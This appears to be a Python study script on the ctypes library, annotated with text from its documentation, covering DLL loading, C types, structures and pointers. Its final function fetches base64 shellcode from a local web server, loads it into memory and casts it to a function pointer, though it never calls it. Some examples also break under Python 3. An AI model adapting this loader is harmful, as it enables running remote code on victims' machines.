from ctypes import *
from struct import *

import os

# ctypes is a foreign function library for Python. It provides C compatible data types, and allows calling functions in DLLs or shared libraries.
# It can be used to wrap these libraries in pure Python.

# Loading dynamic link libraries
# ctypes exports the cdll, and on Windows windll and oledll objects, for loading dynamic link libraries.
# You load libraries by accessing them as attributes of these objects. cdll loads libraries which export functions using the standard cdecl calling convention,
# while windll libraries call functions using the stdcall calling convention.
# oledll also uses the stdcall calling convention, and assumes the functions return a Windows HRESULT error code.
# The error code is used to automatically raise an OSError exception when the function call fails.

# Changed in version 3.3: Windows errors used to raise WindowsError, which is now an alias of OSError.

# Here are some examples for Windows. Note that msvcrt is the MS standard C library containing most standard C functions,
# and uses the cdecl calling convention:


def test_win_dll():

    # Windows appends the usual .dll file suffix automatically.
    print(windll.kernel32)

    # Note Accessing the standard C library through cdll.msvcrt will use an outdated version of the library that may be incompatible with the one being used by Python.
    # Where possible, use native Python functionality, or else import and use the msvcrt module.
    print(cdll.msvcrt)

    # Accessing functions from loaded dlls
    # Functions are accessed as attributes of dll objects:
    libc = cdll.msvcrt
    print(libc.printf)

    print(windll.kernel32.GetModuleHandleA)

    try:
        print(windll.kernel32.MyOtherFunc)
    except AttributeError as e:
        print(e)

    # Sometimes, dlls export functions with names which aren’t valid Python identifiers, like "??2@YAPAXI@Z".
    # In this case you have to use getattr() to retrieve the function:
    try:
        print(getattr(cdll.msvcrt, "??2@YAPAXI@Z"))
    except AttributeError as e:
        print(e)
    # On Windows, some dlls export functions not by name but by ordinal.
    # These functions can be accessed by indexing the dll object with the ordinal number:
    print(cdll.kernel32[1])

    try:
        print(cdll.kernel32[0])
    except AttributeError as e:
        print(e)

    # Calling functions
    if windll.shell32.IsUserAnAdmin():
        print("It is in admin")


def test_linux_dll():

    # On Linux, it is required to specify the filename including the extension to load a library, so attribute access can not be used to load libraries.
    # Either the LoadLibrary() method of the dll loaders should be used, or you should load the library by creating an instance of CDLL by calling the constructor:
    cdll.LoadLibrary("lib.so.6")


def test_fundmental_types():

    # ctypes defines a number of primitive C compatible data types:
    print(c_bool(0))  # _Bool Python(bool)
    print(c_bool(1))

    print(c_char('a'))  # char  python(1-character bytes object)
    print(c_wchar('a'))  # wchar_t Python(1-character string)

    print(c_byte(128))  # char Python(int)
    print(c_ubyte(255))  # unsigned char Python(int)

    print(c_short(200000))  # short Python(int)
    print(c_ushort())  # unsigned short Python(int)

    print(c_int(100))  # int ...
    print(c_uint())  # unsigned int

    print(c_long())  # long
    print(c_ulong())  # unsigned long

    print(c_longlong())  # __int64 or long long
    print(c_ulonglong())  # unsinged __int64 pr usigned long long

    print(c_size_t())  # size_t
    print(c_ssize_t())  # ssize_t or Py_ssize_t

    print(c_float())
    print(c_double())
    print(c_longdouble())  # long double

    # char* (NULL terminated)   Python (bytes object or None )
    print(c_char_p("Hello, World"))
    # wchar_t* (NULL terminated)  Python(string or None)
    print(c_wchar_p("Hello, World"))

    print(c_void_p())  # void* Python(int or None)

    i = c_int(42)
    print(i)
    print(i.value)

    i.value = 100
    print(i)
    print(i.value)

    s = 'Hello world'
    c = c_wchar_p(s)
    print(c)

    c.value = 'Hi there'
    print(c)


class Point(Structure):

    _fields_ = [
        ('x', c_int, 16),
        ('y', c_int, 16)
    ]


class PointArr(Structure):

    _fields_ = [
        ("a", c_int),
        ("b", c_float),
        ("point_array", Point * 4)
    ]


def test_ctype_advanced():

    # Array
    # Arrays are sequences, containing a fixed number of instances of the same type.
    # The recommended way to create array types is by multiplying a data type with a positive integer:

    TenPointsArrayType = Point * 10
    arr = TenPointsArrayType(Point(1, 2), Point(2, 3))
    print(len(arr))
    for pt in arr:
        print(pt.x, pt.y)

    print(len(PointArr().point_array))

    IntArray = c_int * 10
    arrint = IntArray(i for i in range(10))
    for i in arrint:
        print(i)

    # pointer
    # pointer instances are created by calling the pointer() function on a ctypes type:
    i = c_int(42)
    pi = pointer(i)

    # Pointer instances have a contents attribute which returns the object to which the pointer points, the i object above:
    print(pi.contents)

    # Note that ctypes does not have OOR (original object return),
    # it constructs a new, equivalent object each time you retrieve an attribute:
    assert(pi.contents is not i)
    assert(pi.contents is not pi.contents)

    # Assigning another c_int instance to the pointer’s contents attribute would cause the pointer to point to the memory location where this is stored:
    pi.contents = c_int(99)

    # Pointer instances can also be indexed with integers:
    print(pi[0])

    # It is also possible to use indexes different from 0, but you must know what you’re doing, just as in C:
    # You can access or change arbitrary memory locations.
    # Generally you only use this feature if you receive a pointer from a C function, and you know that the pointer actually points to an array instead of a single item.
    pi[0] = 200
    print(pi[0])

    # Behind the scenes, the pointer() function does more than simply create pointer instances, it has to create pointer types first.
    # This is done with the POINTER() function, which accepts any ctypes type, and returns a new type:
    PI = POINTER(c_int)
    try:
        print(PI(42))
    except TypeError:
        pass

    print(PI(c_int(42)))

    # Calling the pointer type without an argument creates a NULL pointer. NULL pointers have a False boolean value:
    null_ptr = POINTER(c_int)()
    print(bool(null_ptr))

    # ctypes checks for NULL when dereferencing pointers (but dereferencing invalid non-NULL pointers would crash Python):
    try:
        null_ptr[0]
        null_ptr[0] = 1234
    except TypeError:
        pass


def test_ctype_exec():
    from urllib.request import urlopen
    import base64
    import ctypes
    # retrieve the shellcode from our web server

    url = "http://localhost:8000/shellcode.bin"
    response = urlopen(url)

    # decode the shellcode from base64
    shellcode = base64.b64decode(response.read())

    # create a buffer in memory
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

    # create a function pointer to our shellcode
    shellcode_func = ctypes.cast(
        shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))


if __name__ == '__main__':

    if os.name == 'nt':
        test_win_dll()
    else:
        test_linux_dll()

    test_fundmental_types()

    test_ctype_advanced()
